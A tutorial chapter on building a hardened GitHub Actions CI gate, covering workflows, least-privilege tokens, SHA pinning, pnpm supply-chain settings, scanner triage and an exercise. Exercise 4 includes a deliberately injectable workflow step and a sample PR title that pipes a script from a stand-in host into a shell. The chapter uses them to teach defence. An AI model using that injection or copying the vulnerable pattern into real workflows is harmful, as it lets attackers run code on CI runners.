# Stage 2: Continuous integration (the PR gate)

**Goal:** every pull request proves itself on a clean machine before it can merge. Lint, types, three test suites, the E2E run, the container images and the security scans all run on GitHub's runners, not on the 8 GB laptop.

## The workflows

| Workflow        | Runs on                                   | Jobs                                                                                                                                                    |
| --------------- | ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ci.yml`        | every PR, every push to `main`            | what changed → lint and typecheck · unit · API integration · E2E (2 shards) → E2E report · images, scan and stack smoke · workflow lint → **CI result** |
| `security.yml`  | every PR, pushes to `main`, Mondays       | CodeQL (TypeScript and the workflows themselves) · Semgrep · dependency review (PRs) · gitleaks over the whole history                                  |
| `scorecard.yml` | pushes to `main`, Mondays, ruleset change | OpenSSF Scorecard, published for the README badge                                                                                                       |
| `pr-title.yml`  | PRs (Stage 0)                             | Conventional PR title                                                                                                                                   |
| `release.yml`   | pushes to `main` (Stage 0)                | release-please                                                                                                                                          |

Shared job setup (pnpm, Node 22.23.3, the pnpm store cache, `pnpm install --frozen-lockfile`) is one local composite action: `.github/actions/setup/action.yml`.

### What each CI job proves

| Job                          | Proves                                                                                                                                                                                                            |
| ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| What changed                 | Lists the PR's files. A PR that only touches docs or Markdown skips the heavy jobs, but "CI result" still reports, so the required check never hangs.                                                             |
| Lint and typecheck           | `pnpm lint` (ESLint + Prettier) and `pnpm typecheck` across the workspace.                                                                                                                                        |
| Unit tests                   | `@qa/shared` and `@qa/web` (Vitest, jsdom).                                                                                                                                                                       |
| API integration tests        | `@qa/api` against a real Postgres 17 in a service container.                                                                                                                                                      |
| E2E (shard 1/2, 2/2)         | The Playwright suite, split across two runners, each with its own Postgres. The blob reports merge into one HTML report (an artifact, kept 14 days).                                                              |
| Images, scan and stack smoke | hadolint and shellcheck; builds the three images with `docker-bake.hcl` and the Actions cache; Trivy fails on fixable HIGH/CRITICAL or secrets; the compose stack's 12 smoke checks; a second migrate is a no-op. |
| Workflow lint                | actionlint (syntax, expressions, shell) and zizmor (workflow security: injection, credentials, pinning).                                                                                                          |
| CI result                    | The one required check. Passes only if every job passed or was skipped.                                                                                                                                           |

## Hardening, and why

- **`permissions: {}` at the top of every workflow.** Each job then asks for exactly what it needs, with a comment saying why (zizmor's pedantic mode checks the comments). The default token can't write anything.
- **Every action is pinned by full commit SHA**, with the tag in a comment. A tag can be moved to malicious code; a SHA can't. Tools that run as containers are pinned by digest.
- **`persist-credentials: false` on every checkout**, so the token isn't left in `.git/config` for later steps to find.
- **Untrusted values never go straight into `run:` scripts.** They pass through `env:` (for example the PR number), which closes off script injection.
- **No `pull_request_target`.** PRs from forks run without secrets or write access.
- **`step-security/harden-runner` in audit mode.** It records every outbound connection a job makes; the run summary links the report. Stage 3 can switch it to `block` with an allow-list.
- **Per-run secrets.** CI generates `BETTER_AUTH_SECRET` and the E2E passwords with `openssl rand`, masks them in logs, and throws them away. The CI databases use `trust` authentication on the runner, so there's no password to leak. CI never publishes to the dev portal.
- **Concurrency.** A new push to a PR cancels the older run; runs on `main` always finish.
- **Timeouts on every job**, so a hung step can't burn hours of runner time.

### Supply-chain settings added to pnpm

`pnpm-workspace.yaml` now also has:

- `blockExoticSubdeps: true`: transitive dependencies come only from the registry, never from git URLs or tarballs.
- `trustPolicy: no-downgrade`: an install fails if a version was published with weaker trust evidence than an earlier one. That's the pattern of a hijacked maintainer account, and it's how attacks such as the 2025 npm worm spread.
  - `trustPolicyIgnoreAfter: 525600` (one year) exempts old release lines that predate provenance (semver 6, undici-types 6).
  - `trustPolicyExclude: prisma@7.10.1`, published by Prisma's usual release bot; none of Prisma's recent releases carry provenance.
  - **lefthook went back from 2.2.2 to 2.2.1.** 2.2.1 was published by GitHub Actions trusted publishing with provenance; 2.2.2 was published by hand without it. Probably harmless, but we can't tell, and 2.2.1 is just as good for us.

Semgrep found these settings missing; that's why it ran locally before going into CI.

## The required check

The `main` ruleset requires **CI result**, plus **Conventional PR title** from Stage 0. Requiring the aggregator instead of each job means a docs-only PR (heavy jobs skipped) can still merge, and adding a job later doesn't mean editing the ruleset.

The security workflow's checks aren't required yet; their findings show in the Security tab and on the PR. We tighten that once we've seen a few weeks of results.

## Triage rules for the scanners

- **A real finding:** fix it in the PR.
- **A false positive:** suppress it next to the code, with the reason: `// nosemgrep: <rule-id>` plus a comment line saying why. Never ignore a whole file. This stage added five such comments (escaped regexes, Better Auth's JSON response).
- **A rule that doesn't fit:** disable it in config with a comment (`--exclude-rule` in `security.yml`, `.github/zizmor.yml`), and say when to revisit.

Two rules are switched off for now:

- **Semgrep `renovate-missing-minimum-release-age`.** It wants the setting repeated in every `packageRules` entry; ours is set once at the top of `renovate.json` and applies to all of them.
- **zizmor `self-repository`.** It recommends GitHub's new `uses: $/...` syntax (July 2026) for in-repo actions, but actionlint 1.7.12, the newest release, rejects it. Revisit when actionlint supports it.

## Exercise (about 45 minutes)

Use a scratch branch for each part, open a PR, watch it fail, then close it without merging.

1. **Lint gate.** Add `const unused = 1` to any `.ts` file. "Lint and typecheck" fails, and so does "CI result". Read the annotation on the PR's Files tab.
2. **Test gate.** Change an expected value in `packages/shared/src/permissions.test.ts`. "Unit tests" fails.
3. **Image gate.** In the `Dockerfile`, remove the `apk upgrade` line from the `web` stage. Trivy fails the image job and names the CVEs it found.
4. **Workflow injection.** In a scratch workflow, add a step `run: echo "${{ github.event.pull_request.title }}"`. zizmor fails with `template-injection`. Explain how a PR title like `"; curl evil.sh | sh; "` would have run on the runner.
5. **A docs-only PR.** Change only a Markdown file. The heavy jobs are skipped, "CI result" passes, and the PR can merge.
6. **Read the Security tab.** Open Security → Code scanning. Filter by tool (CodeQL, Semgrep, Scorecard) and read one Scorecard check: which one scores lowest, and why?
7. **Read a harden-runner report.** Open any CI run, find the harden-runner link in the job summary, and list the domains the E2E job called.

**What you learned:** CI is a contract. The PR must prove, on a machine nobody configured by hand, that it is formatted, typed, tested, buildable, scanned and safe for the workflows themselves. "Works on my machine" stops being an argument.
